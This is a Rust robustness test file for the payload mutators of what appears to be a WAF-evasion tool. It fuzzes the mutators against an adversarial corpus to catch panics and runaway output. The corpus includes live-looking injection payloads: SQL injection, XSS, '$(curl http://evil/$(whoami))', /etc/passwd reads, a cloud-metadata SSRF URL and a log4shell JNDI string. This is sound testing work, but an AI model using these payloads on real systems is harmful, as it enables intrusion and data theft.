//! Deep robustness audit for the grammar mutators.
//!
//! Every public `mutate*` / `classify` / `detect_type` entry point is
//! attacker-reachable: `wafrift scan`, `wafrift evade`, and the proxy
//! all feed *user-supplied payloads* straight into these functions. A
//! payload is hostile by construction — the whole point of the tool is
//! that operators paste in weird, encoded, multibyte, oversized,
//! deeply-nested strings. If any mutator panics, slices mid-codepoint,
//! integer-overflows an index, or blows output up super-linearly, the
//! tool is unusable on exactly the inputs it exists to handle.
//!
//! This file asserts three contracts against a hand-built adversarial
//! corpus AND a proptest fuzz of arbitrary text / arbitrary bytes:
//!
//!   1. **No panic.** Every entry point returns for every input. We run
//!      each call under `catch_unwind` so a failure names the exact
//!      function + the exact input that broke it (a bare `cargo test`
//!      panic would only show one).
//!   2. **Cap honoured.** `mutate(_as)` with `max_mutations = N` never
//!      returns more than `N` variants.
//!   3. **Bounded expansion.** No single variant exceeds
//!      `input.len() * 64 + 65_536` bytes — catches accidental
//!      quadratic/exponential blowup that turns a 1 KB payload into a
//!      multi-GB allocation (a self-DoS).
//!
//! These are not smoke tests: each assertion names the offending input
//! and function, has a negative twin (the corpus includes benign
//! payloads that must still produce valid output), and runs through the
//! real public API the binary calls.

use std::panic::{AssertUnwindSafe, catch_unwind};

use wafrift_grammar::grammar::{
    self, PayloadType, cassandra, classify, cmd, cmd_windows, elastic, ldap, mongo,
    path_traversal, polyglot, redis, ssrf, template, xss,
};

const ALL_TYPES: &[PayloadType] = &[
    PayloadType::Sql,
    PayloadType::Xss,
    PayloadType::CommandInjection,
    PayloadType::Ldap,
    PayloadType::Ssrf,
    PayloadType::PathTraversal,
    PayloadType::TemplateInjection,
    PayloadType::NoSql,
    PayloadType::Unknown,
];

/// Sane upper bound on per-variant expansion. A mutator legitimately
/// expands (entity-encode every byte, version-comment every space) but
/// never to more than ~64× + a fixed slack. Anything past this is a bug.
fn expansion_ceiling(input_len: usize) -> usize {
    input_len.saturating_mul(64).saturating_add(65_536)
}

/// Hand-built adversarial corpus. Each entry targets a specific class
/// of index/slice/encoding bug that real payloads hit in the field.
fn adversarial_corpus() -> Vec<(&'static str, String)> {
    let mut v: Vec<(&'static str, String)> = vec![
        // ── degenerate sizes ──
        ("empty", String::new()),
        ("single_quote", "'".into()),
        ("single_byte", "a".into()),
        ("two_bytes", "ab".into()),
        ("only_spaces", "     ".into()),
        ("only_newlines", "\n\n\r\n".into()),
        // ── multibyte UTF-8 directly adjacent to grammar delimiters ──
        // These break any `&payload[i..i+k]` that derives `k` from a
        // byte count rather than a char boundary.
        ("quote_then_2byte", "'é".into()),
        ("quote_2byte_quote", "'é'".into()),
        ("paren_3byte", "(日)".into()),
        ("sql_quoted_4byte", "SELECT '𝕏𝕐𝕑' FROM t".into()),
        ("xss_tag_cjk", "<script>日本語</script>".into()),
        ("combining_marks", "e\u{0301}\u{0301}\u{0301}'".into()),
        ("zero_width", "ad\u{200B}min'--".into()),
        ("nbsp_pad", "1\u{00A0}OR\u{00A0}1=1".into()),
        ("rtl_override", "\u{202E}' OR 1=1 --".into()),
        ("emoji_zwj", "😀🏴‍☠️' UNION SELECT".into()),
        ("surrogate_ish", "\u{10FFFF}\u{1F600}'".into()),
        // ── control / NUL bytes (valid UTF-8, hostile shape) ──
        ("nul_controls", "\u{0}\u{1}\u{2}'\u{7f}".into()),
        ("nul_in_sql", "' OR\u{0}1=1--".into()),
        ("all_c0", (0u8..0x20).map(|b| b as char).collect()),
        ("del_run", "\u{7f}".repeat(64)),
        // ── delimiter floods (index arithmetic stressors) ──
        ("quote_flood", "'".repeat(4096)),
        ("paren_flood", "(".repeat(4096)),
        ("mixed_paren", "()()()((()))((".repeat(256)),
        ("backslash_flood", "\\".repeat(4096)),
        ("angle_flood", "<>".repeat(4096)),
        ("equals_flood", "=".repeat(4096)),
        ("semicolon_flood", ";".repeat(4096)),
        // ── realistic injection payloads (benign twins: must work) ──
        ("sqli_tautology", "' OR '1'='1' -- ".into()),
        ("sqli_union", "1 UNION SELECT username,password FROM users".into()),
        ("sqli_stacked", "1; DROP TABLE users; --".into()),
        ("xss_img", "<img src=x onerror=alert(1)>".into()),
        ("xss_svg", "<svg/onload=alert(1)>".into()),
        ("cmd_chain", "; cat /etc/passwd #".into()),
        ("cmd_subst", "$(curl http://evil/$(whoami))".into()),
        ("path_trav", "../../../../etc/passwd".into()),
        ("path_trav_enc", "..%2f..%2f..%2fetc%2fpasswd".into()),
        ("ldap_inj", "*)(uid=*))(|(uid=*".into()),
        ("ssrf_meta", "http://169.254.169.254/latest/meta-data/".into()),
        ("ssti_jinja", "{{7*7}}${7*7}#{7*7}<%=7*7%>".into()),
        ("nosql_op", "{\"$gt\": \"\"}".into()),
        ("log4shell", "${jndi:ldap://evil/a}".into()),
        // ── nesting / recursion stressors ──
        ("deep_braces", "{{".repeat(2000) + &"}}".repeat(2000)),
        ("deep_jinja", "{{".to_string() + &"a|".repeat(1000) + "}}"),
        ("nested_subshell", "$(".repeat(1000) + &")".repeat(1000)),
        ("nested_comment", "/*".repeat(1000) + &"*/".repeat(1000)),
        // ── encoding-confusion shapes ──
        ("double_pct", "%2525%2527".repeat(256)),
        ("mixed_case_kw", "SeLeCt UnIoN sElEcT".into()),
        ("utf8_overlong_text", "\u{FEFF}SELECT".into()),
        ("homoglyph_select", "ЅЕLЕСТ".into()), // Cyrillic look-alikes
        // ── size ceiling ── (kept modest so the full corpus×types×caps
        // matrix stays fast; the precise large-input perf contract is
        // enforced separately by `regression_*_is_bounded`).
        ("big_ascii", "A".repeat(16_384)),
        ("big_unicode", "あ".repeat(8_192)),
        ("big_payload", "' OR 1=1 -- ".repeat(1_500)),
    ];
    // A unicode codepoint at every byte-boundary offset 1..=4 after a
    // quote — directly targets `&p[start+1 .. start+1+k]` arithmetic.
    for pad in 0..6 {
        let s = format!("'{}{}'", "x".repeat(pad), "€日𝕏");
        v.push(("boundary_sweep", s));
    }
    v
}

/// Run `f(input)` and record a structured failure instead of aborting
/// the whole test on the first panic, so one run enumerates *every*
/// broken (function, input) pair.
fn guard<R>(
    failures: &mut Vec<String>,
    func: &str,
    label: &str,
    input: &str,
    f: impl FnOnce() -> R,
) -> Option<R> {
    match catch_unwind(AssertUnwindSafe(f)) {
        Ok(r) => Some(r),
        Err(_) => {
            failures.push(format!(
                "PANIC: {func} on input [{label}] (len={}, prefix={:?})",
                input.len(),
                input.chars().take(24).collect::<String>()
            ));
            None
        }
    }
}

fn check_variants(
    failures: &mut Vec<String>,
    func: &str,
    label: &str,
    input_len: usize,
    cap: Option<usize>,
    variants: &[String],
) {
    if let Some(cap) = cap
        && variants.len() > cap
    {
        failures.push(format!(
            "CAP VIOLATION: {func} [{label}] returned {} > max_mutations {cap}",
            variants.len()
        ));
    }
    let ceiling = expansion_ceiling(input_len);
    for (i, var) in variants.iter().enumerate() {
        if var.len() > ceiling {
            failures.push(format!(
                "EXPANSION: {func} [{label}] variant #{i} is {} bytes > ceiling {ceiling} (input {input_len})",
                var.len()
            ));
            break;
        }
    }
}

#[test]
fn grammar_mutators_survive_adversarial_corpus() {
    let mut failures: Vec<String> = Vec::new();

    for (label, payload) in adversarial_corpus() {
        let p = payload.as_str();
        let ilen = p.len();

        // classify must never panic and must return *some* type.
        guard(&mut failures, "classify", label, p, || classify(p));

        // grammar::mutate / mutate_as across every cap and every type.
        for &cap in &[0usize, 1, 8, 64, 1000] {
            if let Some(out) =
                guard(&mut failures, "grammar::mutate", label, p, || grammar::mutate(p, cap))
            {
                let v: Vec<String> = out.into_iter().map(|m| m.payload).collect();
                check_variants(&mut failures, "grammar::mutate", label, ilen, Some(cap), &v);
            }
            for &ty in ALL_TYPES {
                if let Some(out) = guard(&mut failures, "grammar::mutate_as", label, p, || {
                    grammar::mutate_as(p, ty, cap)
                }) {
                    let v: Vec<String> = out.into_iter().map(|m| m.payload).collect();
                    check_variants(
                        &mut failures,
                        "grammar::mutate_as",
                        label,
                        ilen,
                        Some(cap),
                        &v,
                    );
                }
            }
        }

        // Per-language mutators (the ones with hand-rolled index math).
        for &cap in &[1usize, 64] {
            if let Some(v) = guard(&mut failures, "sql::mutate", label, p, || {
                sql_payloads(p, cap)
            }) {
                check_variants(&mut failures, "sql::mutate", label, ilen, Some(cap), &v);
            }
            if let Some(v) = guard(&mut failures, "xss::mutate", label, p, || {
                xss::mutate(p, cap).into_iter().map(|m| m.payload).collect::<Vec<_>>()
            }) {
                check_variants(&mut failures, "xss::mutate", label, ilen, Some(cap), &v);
            }
            if let Some(v) = guard(&mut failures, "cmd::mutate", label, p, || {
                cmd::mutate(p, cap).into_iter().map(|m| m.payload).collect::<Vec<_>>()
            }) {
                check_variants(&mut failures, "cmd::mutate", label, ilen, Some(cap), &v);
            }
            if let Some(v) = guard(&mut failures, "cmd_windows::mutate", label, p, || {
                cmd_windows::mutate(p, cap)
                    .into_iter()
                    .map(|m| m.payload)
                    .collect::<Vec<_>>()
            }) {
                check_variants(
                    &mut failures,
                    "cmd_windows::mutate",
                    label,
                    ilen,
                    Some(cap),
                    &v,
                );
            }
        }
        for (fname, f) in nullary_mutators() {
            if let Some(v) = guard(&mut failures, fname, label, p, || f(p)) {
                check_variants(&mut failures, fname, label, ilen, None, &v);
            }
        }
        for ctx in ["sql", "xss", "html", "json", "", "🦀", "../"] {
            guard(&mut failures, "polyglot::polyglots_for", label, ctx, || {
                polyglot::polyglots_for(ctx)
            });
        }
        for (fname, f) in detectors() {
            guard(&mut failures, fname, label, p, || f(p));
        }
    }

    assert!(
        failures.is_empty(),
        "grammar robustness audit found {} defect(s):\n{}",
        failures.len(),
        failures.join("\n")
    );
}

fn sql_payloads(p: &str, cap: usize) -> Vec<String> {
    grammar::sql::mutate(p, cap)
        .into_iter()
        .map(|m| m.payload)
        .collect()
}

#[allow(clippy::type_complexity)]
fn nullary_mutators() -> Vec<(&'static str, fn(&str) -> Vec<String>)> {
    vec![
        ("path_traversal::mutate", path_traversal::mutate),
        ("ldap::mutate", ldap::mutate),
        ("ssrf::mutate", ssrf::mutate),
        ("template::mutate", template::mutate),
        ("mongo::mutate", mongo::mutate),
        ("redis::mutate", redis::mutate),
        ("elastic::mutate", elastic::mutate),
        ("cassandra::mutate", cassandra::mutate),
    ]
}

#[allow(clippy::type_complexity)]
fn detectors() -> Vec<(&'static str, fn(&str) -> bool)> {
    vec![
        ("path_traversal::detect_type", path_traversal::detect_type),
        ("template::detect_type", template::detect_type),
        ("mongo::detect_type", mongo::detect_type),
        ("redis::detect_type", redis::detect_type),
        ("elastic::detect_type", elastic::detect_type),
        ("cassandra::detect_type", cassandra::detect_type),
        ("cmd_windows::detect_type", cmd_windows::detect_type),
    ]
}

// ───────────────────── pinned regressions (handwritten) ─────────────────────
//
// Each `#[test]` below freezes a specific input that once panicked a
// mutator, so the bug can never silently come back even if proptest's
// failure-persistence file is absent (it is, for integration tests).

/// `sql/strings.rs::split_string_concat` sliced `&value[..i]` for every
/// byte index `i`, panicking the instant `i` fell inside a multibyte
/// codepoint. `String::from_utf8_lossy` of arbitrary bytes (how the CLI
/// turns `--payload-b64`/`--stdin` into a `&str`) yields exactly such
/// strings — here `0xFF 'J'` → `"\u{FFFD}J"`, where byte index 1 is
/// inside the 3-byte replacement char.
#[test]
fn regression_sql_split_string_concat_multibyte_no_panic() {
    let inputs = [
        String::from_utf8_lossy(&[0xFF, b'J']).into_owned(), // "�J"
        String::from_utf8_lossy(&[b'\'', 0xC0, 0xAF, b'\'']).into_owned(),
        "'café'".to_string(),
        "'日'".to_string(),
        "'𝕏'".to_string(),
        "a€".to_string(),
    ];
    for inp in inputs {
        // Must not panic, for every cap, through the public path.
        let _ = grammar::sql::mutate(&inp, 64);
        let _ = grammar::mutate_as(&inp, PayloadType::Sql, 64);
    }
}

/// The same function used to allocate `3 * (len - 1)` formatted strings
/// — a 200 KB payload meant ~600 000 allocations the caller discards.
/// Assert the split-point fan-out is now bounded regardless of input
/// size (a 50 KB string must still return quickly and small).
#[test]
fn regression_sql_split_string_concat_is_bounded() {
    let big = format!("'{}'", "A".repeat(50_000));
    let start = std::time::Instant::now();
    let out = grammar::sql::mutate(&big, 1_000);
    assert!(
        start.elapsed() < std::time::Duration::from_secs(5),
        "sql::mutate on a 50 KB string took {:?} — split fan-out is unbounded",
        start.elapsed()
    );
    assert!(
        out.len() <= 1_000,
        "cap broken: {} variants for max_mutations=1000",
        out.len()
    );
}

// ─────────────────────────── proptest fuzz ───────────────────────────

mod fuzz {
    use super::*;
    use proptest::prelude::*;

    proptest! {
        #![proptest_config(ProptestConfig::with_cases(1500))]

        /// Arbitrary UTF-8 text (any unicode, any length up to 4 KB)
        /// must never panic or super-expand any mutator.
        #[test]
        fn arbitrary_text_is_panic_free(s in ".{0,4096}") {
            let cap = 32;
            let _ = classify(&s);
            for &ty in ALL_TYPES {
                let out = grammar::mutate_as(&s, ty, cap);
                prop_assert!(out.len() <= cap, "cap broken: {} > {cap}", out.len());
                let ceiling = expansion_ceiling(s.len());
                for m in &out {
                    prop_assert!(
                        m.payload.len() <= ceiling,
                        "expansion: {} > {ceiling}", m.payload.len()
                    );
                }
            }
        }

        /// Arbitrary *bytes* (lossily decoded the way the CLI does)
        /// must also be safe — payloads arrive from base64/stdin and
        /// are not guaranteed clean UTF-8 upstream.
        #[test]
        fn arbitrary_bytes_lossy_is_panic_free(bytes in prop::collection::vec(any::<u8>(), 0..2048)) {
            let s = String::from_utf8_lossy(&bytes);
            let _ = classify(&s);
            let _ = grammar::mutate(&s, 16);
            let _ = grammar::sql::mutate(&s, 16);
            let _ = xss::mutate(&s, 16);
            let _ = cmd::mutate(&s, 16);
            let _ = path_traversal::mutate(&s);
            let _ = ldap::mutate(&s);
            let _ = ssrf::mutate(&s);
            let _ = template::mutate(&s);
        }

        /// Quote/paren-dense strings (the index-arithmetic danger zone)
        /// with unicode mixed in.
        #[test]
        fn delimiter_dense_unicode_is_safe(
            n in 0usize..400,
            tail in "[\\x{80}-\\x{10FFFF}]{0,16}",
        ) {
            let s = format!("'{}{}'", "()".repeat(n), tail);
            for &ty in ALL_TYPES {
                let _ = grammar::mutate_as(&s, ty, 24);
            }
        }
    }
}
